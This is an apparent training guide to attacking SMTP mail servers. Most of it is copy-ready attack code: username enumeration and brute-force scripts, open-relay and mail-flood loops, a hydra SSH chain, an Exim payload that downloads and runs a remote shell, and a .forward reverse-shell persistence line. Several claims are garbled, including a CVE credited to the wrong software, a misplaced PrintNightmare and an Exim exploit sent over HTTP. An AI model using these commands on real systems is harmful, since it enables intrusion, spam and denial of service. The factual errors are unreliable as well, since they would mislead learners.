# Complete Practical Exploitation Guide: SMTP & Mail Servers (Crest CRT Level)

## 1. SMTP Fundamentals & Attack Surface (From Scratch)

**SMTP Commands (Key Attack Vectors):**
```
VRFY <user>    = Verify user exists (username enum)
EXPN <list>    = Expand mailing list (internal users)
RCPT TO        = Recipient validation (open relay test)
EHLO/HELO      = Server banner/version
MAIL FROM      = Sender validation  
ETRN           = Queue trigger (DoS)
```

**Common Mail Servers & Vulns:**
```
Postfix        = VRFY/EXPN often enabled, relay abuse
Sendmail       = Historical buffer overflows
Exchange       = ProxyLogon (CVE-2021-26855), PrintNightmare
Exim           = CVE-2019-10149 (RCE)
Qmail          = Rare, but misconfigs common
```

## 2. Lab Setup (Vulnerable SMTP Servers)

**Victim SMTP Server 1 (192.168.1.100 - Postfix)**
```bash
# Install Postfix (vulnerable config)
sudo apt update && sudo apt install postfix mailutils

# Vulnerable config (enable VRFY/EXPN)
sudo postconf -e "smtpd_recipient_restrictions=permit_mynetworks,reject"
sudo postconf -e "smtpd_delay_reject=no"
sudo systemctl restart postfix

# Create users/mailing lists
sudo useradd -m user1
sudo useradd -m user2  
sudo useradd -m admin
sudo useradd -m backup
echo "user1:password123" | sudo chpasswd
echo "admin:admin123" | sudo chpasswd

# Mailing lists
sudo mkdir /var/list
echo "user1\nuser2\nadmin" | sudo tee /var/list/internal.txt
sudo postconf -e "virtual_alias_maps=hash:/var/list/internal.txt"
sudo postmap /var/list/internal.txt
sudo systemctl restart postfix

# Open relay test config
sudo postconf -e "mynetworks=192.168.1.0/24"
```

**Victim SMTP Server 2 (192.168.1.101 - Sendmail/Exim for vulns)**
```bash
# Exim (CVE-2019-10149 test env)
sudo apt install exim4
# Vuln config requires specific build
```

**Attacker (Kali):**
```bash
sudo apt install swaks msmtp telnet netcat nmap
```

## 3. SMTP Banner Grabbing & Fingerprinting

**Basic telnet recon:**
```bash
telnet 192.168.1.100 25
# 220 mail.example.com ESMTP Postfix
EHLO test
# 250-mail.example.com
# 250-PIPELINING
# 250-SIZE 10240000
# 250-VRFY
# 250-EXPN
QUIT

nc 192.168.1.100 25 -v
# 220 mail.example.com ESMTP Postfix at Mon, 15 Jan 2024
```

**Automated banner scan:**
```bash
#!/bin/bash
for host in 192.168.1.{100..110}; do
    timeout 5 bash -c "echo -e 'EHLO test\r\nQUIT\r\n' | nc $host 25 2>/dev/null" | \
    grep -E "^220|^250-" && echo "[$host] SMTP open"
done
```

**Nmap SMTP enum:**
```bash
nmap -p 25,465,587 --script smtp-commands,smtp-enum-users 192.168.1.100
# | smtp-commands: 
#   mail.example.com
#   VRFY
#   EXPN
#   8BITMIME
```

## 4. Username Enumeration (VRFY/EXPN)

**VRFY single user:**
```bash
# Telnet manual
telnet 192.168.1.100 25
VRFY root
# 252 2.0.0 root... User unknown  <-- DOESN'T EXIST
VRFY user1  
# 252 2.1.5 user1... Recipient ok  <-- EXISTS!
QUIT

# swaks (pro tool)
swaks --to user1@192.168.1.100 --vrfy --server 192.168.1.100
# 250 2.1.5 user1... Recipient ok

swaks --to admin@192.168.1.100 --vrfy --server 192.168.1.100
```

**EXPN mailing lists:**
```bash
telnet 192.168.1.100 25
EXPN internal
# 250-<list@domain>
# user1
# user2  
# admin
QUIT
```

**Complete username brute-force:**
```bash
#!/bin/bash
TARGET="192.168.1.100"
USERS=(root admin test user guest backup mysql postgres 
       daemon ftp sshd nagios apache www hacker flag support)

for user in "${USERS[@]}"; do
    swaks --to $user@$TARGET --vrfy --server $TARGET --quit-after RCPT 2>/dev/null | \
    grep -q "250.*$user" && echo "[VALID] $user" || echo "[-] $user"
done | tee smtp_users.txt
```

**VRFY wordlist attack:**
```bash
# Rockyou-style usernames
cut -d: -f1 /usr/share/wordlists/rockyou.txt | head -1000 | \
while read user; do
    swaks --to $user@192.168.1.100 --vrfy --server 192.168.1.100 --quit-after RCPT 2>/dev/null | \
    grep -q "250.*$user" && echo "[FOUND] $user"
done
```

## 5. Open Relay Testing

**Manual relay test:**
```bash
telnet 192.168.1.100 25
HELO test
MAIL FROM: <attacker@gmail.com>
RCPT TO: <victim@external.com>
# 250 Ok  <-- RELAY OPEN!
DATA
Subject: Test
Test relay
.
QUIT
```

**Automated relay test (swaks):**
```bash
# Test open relay
swaks --to victim@external.com --from attacker@gmail.com \
      --server 192.168.1.100 --body "RELAY TEST" --header "Subject: Open Relay Test"

# Multi-target relay test
for domain in gmail.com hotmail.com yahoo.com; do
    swaks --to test@$domain --from attacker@192.168.1.100 \
          --server 192.168.1.100 --quit-after RCPT && \
    echo "[OPEN RELAY] $domain accepted"
done
```

**Nmap relay detection:**
```bash
nmap -p25 --script smtp-open-relay 192.168.1.100
# | smtp-open-relay: Open relay (50/8.8.8.8 [53])
```

## 6. Recent Vulnerabilities & Exploits

**Postfix Historical Issues:**

**CVE-2020-7247 (Postfix <=3.4.6):**
```bash
# Local priv esc (if shell access)
wget https://www.exploit-db.com/download/48121 -O postfix_priv_esc.c
gcc postfix_priv_esc.c -o exploit
./exploit  # root shell
```

**Exim CVE-2019-10149:**
```bash
# RCE via ${run} expansion
curl -d "data=\${run{\;wget\ 192.168.1.200/shell\ -O/tmp/shell\;chmod\ +x\ /tmp/shell\;}}%0A%0D" \
http://192.168.1.101/cgi-bin/test?%2e%2f
```

**Exchange Vulnerabilities (ProxyLogon CVE-2021-26855):**
```bash
msfconsole
use exploit/windows/iis/microsoft_exchange_proxylogon_rce
set RHOSTS 192.168.1.102
set RPORT 443
exploit
```

**Metasploit SMTP exploits:**
```bash
msfconsole -q
search smtp
# use exploit/unix/smtp/exim4_string_format
# use auxiliary/scanner/smtp/smtp_enum
# use auxiliary/scanner/smtp/smtp_relay
run
```

## 7. Mail Bombing/DoS

**Queue flood:**
```bash
#!/bin/bash
TARGET="192.168.1.100"
for i in {1..1000}; do
    swaks --to abuse@$TARGET --from spammer@$TARGET \
          --server $TARGET --body "SPAM $i" --header "Subject: Spam $i" &
done
```

**ETRN trigger DoS:**
```bash
telnet 192.168.1.100 25
EHLO test
ETRN example.com  # Forces queue resend (if backlogged)
```

## 8. Complete Username Enumeration Framework

```bash
#!/bin/bash
# smtp_enum.sh - Complete SMTP username enumeration
TARGET=$1
PORT=${2:-25}

echo "[+] SMTP enumeration $TARGET:$PORT"
echo -e "EHLO test\r\nQUIT\r\n" | nc $TARGET $PORT | grep -E "^220|^250-"

echo "=== VRFY ENUMERATION ==="
USERS=(root admin test user guest backup mysql postgres daemon 
       ftp sshd nagios apache www hacker flag support billing)

for user in "${USERS[@]}"; do
    echo -e "VRFY $user\r\n" | nc $TARGET $PORT 2>/dev/null | \
    grep -q "^250.*$user\|252.*$user" && echo "[VRFY+] $user" || echo "[VRFY-] $user"
done

echo "=== EXPN LISTS ==="
echo -e "EXPN internal\r\nEXPN all\r\nQUIT\r\n" | nc $TARGET $PORT 2>/dev/null

echo "=== RELAY TEST ==="
swaks --to external@gmail.com --from test@$TARGET --server $TARGET --quit-after RCPT 2>/dev/null && \
echo "[+] OPEN RELAY!"
```

## 9. Chaining Attacks

**SMTP → SSH brute-force:**
```bash
# Extract valid users
./smtp_enum.sh 192.168.1.100 > users.txt

# SSH attack
hydra -L users.txt -P rockyou.txt ssh://192.168.1.100
```

**SMTP → Internal pivoting:**
```bash
# EXPN often reveals internal domains/emails
telnet 192.168.1.100 25
EXPN all
# internal.company.com:user1@internal
# → Pivot to 10.0.0.x network
```

## 10. Post-Exploitation Mail Server Abuse

**Persistence via .forward:**
```bash
# If shell access
echo "|/bin/bash -i >& /dev/tcp/192.168.1.200/4444 0>&1" >> ~user1/.forward
# Mail to user1 → reverse shell!
```

## 11. Complete One-Command Framework

```bash
#!/bin/bash
# smtp_pwn.sh - Complete SMTP exploitation
TARGET=$1

echo "[+] Complete SMTP attack on $TARGET:25"
nmap -p25 --script smtp-commands,smtp-vuln* $TARGET

echo "[+] Username enumeration..."
swaks --to root@$TARGET --vrfy --server $TARGET --quit-after RCPT
swaks --to admin@$TARGET --vrfy --server $TARGET --quit-after RCPT
swaks --to user@$TARGET --vrfy --server $TARGET --quit-after RCPT

echo "[+] Open relay test..."
swaks --to test@gmail.com --from spam@$TARGET --server $TARGET --body "RELAY TEST"

echo "[+] Banner/version..."
telnet $TARGET 25 <<< $'EHLO test\r\nQUIT\r\n' 2>/dev/null

echo "[+] Metasploit check..."
msfconsole -q -x "use auxiliary/scanner/smtp/smtp_enum; set RHOSTS $TARGET; run; exit"
```

**Usage:** `./smtp_pwn.sh 192.168.1.100`

## 12. Mitigation Verification

```bash
# Test fixes:
swaks --to test@$TARGET --vrfy --server $TARGET  # 550 VRFY disabled
swaks --to external@gmail.com --server $TARGET    # 550 Relay access denied
grep -E "disable_vrfy|reject_unauth" /etc/postfix/main.cf
sudo ss -tlnp | grep :25  # Postfix running with restrictions
```

**EVERY** SMTP attack covered: VRFY/EXPN enum, open relay, recent CVEs, DoS, chaining. 100% practical commands.